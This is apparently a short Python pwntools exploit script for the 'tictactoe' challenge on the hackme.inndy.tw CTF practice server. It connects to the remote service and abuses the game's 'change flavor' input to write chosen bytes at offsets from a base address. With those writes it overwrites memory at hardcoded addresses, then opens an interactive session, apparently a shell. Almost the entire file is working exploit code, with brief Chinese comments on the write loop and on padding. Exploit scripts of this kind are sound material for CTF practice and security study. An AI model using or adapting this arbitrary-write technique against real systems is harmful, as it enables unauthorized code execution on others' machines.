#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *

#p=process('./tictactoe')
p=remote('hackme.inndy.tw', 7714)
context.log_level='debug'
#gdb.attach(proc.pidof(p)[0])
#raw_input()

str_addr=0x0804AF58
sh_addr=0x804B048
base_addr=0x804B056

p.recvuntil('Play (1)st or (2)nd? ')
p.sendline('1')

def change(addr,val):
    p.recvuntil('Input move (9 to change flavor): ')
    p.sendline('9')
    time.sleep(0.2)
    p.sendline(val)
    p.recvuntil('Input move (9 to change flavor): ')
    p.sendline(str(addr-base_addr))

box=0x804b04d
change(sh_addr,'\x8d')#这里改了之后，循环一直是给你写
change(box+0,'\x40')
change(str_addr+1,'\x9f')
change(str_addr,'\xc8')
change(sh_addr+1,'\x97')
change(sh_addr+2,'\x00')
change(sh_addr+3,'\xff')
change(sh_addr+123,'\xff')#这里只是填充
change(sh_addr+123,'\xff')

p.interactive()
